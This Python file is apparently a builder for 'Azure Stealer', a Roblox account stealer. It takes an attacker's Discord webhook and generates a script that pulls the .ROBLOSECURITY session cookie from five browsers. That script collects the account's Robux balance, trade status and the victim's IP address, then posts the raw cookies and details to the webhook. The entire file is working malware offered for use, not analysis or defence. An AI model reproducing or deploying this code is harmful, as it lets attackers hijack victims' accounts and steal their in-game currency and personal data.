from pystyle import Col , System , Colorate , Center

def Builder(webhook):
    src = """
import browser_cookie3
import robloxpy
from requests import get , post

webhook = '"""+ webhook +r"""'

# get cookies

chrome_cookie = None
firefox_cookie = None
edge_cookie = None
brave_cookie = None
opera_cookie = None
try : 
    cookies = browser_cookie3.chrome(domain_name='roblox.com')
    for cookie in cookies : 
        if cookie.name == ".ROBLOSECURITY" :
            chrome_cookie = cookie.value
except : 
    chrome_cookie = None

try : 
    cookies = browser_cookie3.firefox(domain_name='roblox.com')
    for cookie in cookies : 
        if cookie.name == ".ROBLOSECURITY" :
            firefox_cookie = cookie.value
except : 
    firefox_cookie = None

try : 
    cookies = browser_cookie3.edge(domain_name='roblox.com')
    for cookie in cookies : 
        if cookie.name == ".ROBLOSECURITY" :
            edge_cookie = cookie.value
except : 
    edge_cookie = None

try : 
    cookies = browser_cookie3.brave(domain_name='roblox.com')
    for cookie in cookies : 
        if cookie.name == ".ROBLOSECURITY" :
            brave_cookie = cookie.value
except : 
    brave_cookie = None

try : 
    cookies = browser_cookie3.opera(domain_name='roblox.com')
    for cookie in cookies : 
        if cookie.name == ".ROBLOSECURITY" :
            opera_cookie = cookie.value
except : 
    opera_cookie = None

# check cookie

valid_cookie = []

if chrome_cookie == None :
    pass
else :
    chrome_checker = robloxpy.Utils.CheckCookie(chrome_cookie)

    if chrome_checker == 'Valid Cookie' : 
        valid_cookie.append(chrome_cookie)
    else : 
        data = {"content" : "Invalid Cookie found in `GoogleChrome`","username" : "Azure Stealer"}  
        post(url=webhook , data=data)

if firefox_cookie == None :
    pass
else :
    firefox_checker = robloxpy.Utils.CheckCookie(firefox_cookie)

    if firefox_checker == 'Valid Cookie' :
        valid_cookie.append(firefox_cookie)
    else : 
        data = {"content" : "Invalid Cookie found in `Firefox`","username" : "Azure Stealer"}  
        post(url=webhook , data=data)

if edge_cookie == None :
    pass
else :
    edge_checker = robloxpy.Utils.CheckCookie(edge_cookie)

    if edge_checker == 'Valid Cookie':
        valid_cookie.append(edge_cookie)
    else :
        data = {"content" : "Invalid Cookie found in `MicrosoftEdge`","username" : "Azure Stealer"}  
        post(url=webhook , data=data)

if brave_cookie == None :
    pass
else :
    brave_checker = robloxpy.Utils.CheckCookie(brave_cookie)

    if brave_checker == 'Valid Cookie':
        valid_cookie.append(brave_cookie)
    else :
        data = {"content" : "Invalid Cookie found in `Brave`","username" : "Azure Stealer"}  
        post(url=webhook , data=data)

if opera_cookie == None :
    pass
else :
    opera_checker = robloxpy.Utils.CheckCookie(opera_cookie)

    if opera_checker == 'Valid Cookie' :
        valid_cookie.append(opera_cookie)
    else : 
        data = {"content" : "Invalid Cookie found in `Opera`","username" : "Azure Stealer"}  
        post(url=webhook , data=data)

# parse data from cookies

for account in valid_cookie :
    
    infos = get('https://www.roblox.com/my/settings/json' , cookies={'.ROBLOSECURITY' : account}).json()
    x=get('https://roblox.com/mobileapi/userinfo' , cookies={'.ROBLOSECURITY' : account}).json()

    trade_status = infos['CanTrade']
    username = x['UserName']
    robux = x["RobuxBalance"]
    premium_status = x['IsPremium']
    thumbnail = x['ThumbnailUrl']
    creation_date = robloxpy.User.External.CreationDate(x['UserID'])
    ip = get('https://api.ipify.org/').text
    friends_count = get(f"https://friends.roblox.com/v1/users/{x['UserID']}/friends/count").json()
    friends = friends_count['count']

    embeds = [{"title": "+ 1 Cookie :cookie:","description": "","url": "https://discord.gg/YBw3SFYAg8","color": 0xcc00cc,"fields": [{"name": "Username","value": f"`{username}`","inline": True},{"name": "Robux Amount","value": f"`{robux}`","inline": True},{"name": "Trade Status","value": f"`{trade_status}`","inline": True},{"name": "Premium Status","value": f"`{premium_status}`","inline": True},{"name": "Creation Date","value": f"`{creation_date}`","inline": True},{"name": "Friends Amount","value": f"`{friends}`","inline": True},{"name": "IP Adress","value": f"`{ip}`","inline": True},{"name": "Roblox Cookie","value": f"```fix\n{account} ```","inline": False},],"thumbnail": {"url": f"{thumbnail}"},"footer": {"text": "Azure Stealer","icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Robux_2019_Logo_gold.svg/1883px-Robux_2019_Logo_gold.svg.png"}}]
    data = {"username": "Azure Stealer","embeds": embeds}

    post(url=webhook , json=data) """

    stealer=open('stealer.py' , 'a+').write(src)
    input(f"[{Col.blue}!{Col.reset}] Finished the stealer are in {Col.pink}stealer.py{Col.reset}")

def Main() :

    azure_stealer = """
                                  _____ _             _           
     /\                          / ____| |           | |          
    /  \    _____   _ _ __ ___  | (___ | |_ ___  __ _| | ___ _ __ 
   / /\ \  |_  / | | | '__/ _ \  \___ \| __/ _ \/ _` | |/ _ \ '__|
  / ____ \  / /| |_| | | |  __/  ____) | ||  __/ (_| | |  __/ |   
 /_/    \_\/___|\__,_|_|  \___| |_____/ \__\___|\__,_|_|\___|_|   
                                                                  """

    print(Colorate.Horizontal(Col.blue_to_cyan, Center.XCenter(azure_stealer)))
    webhook = input(f'[{Col.blue}?{Col.reset}] Import you webhook {Col.cyan}>>{Col.reset} ')
    Builder(webhook=webhook)

Main()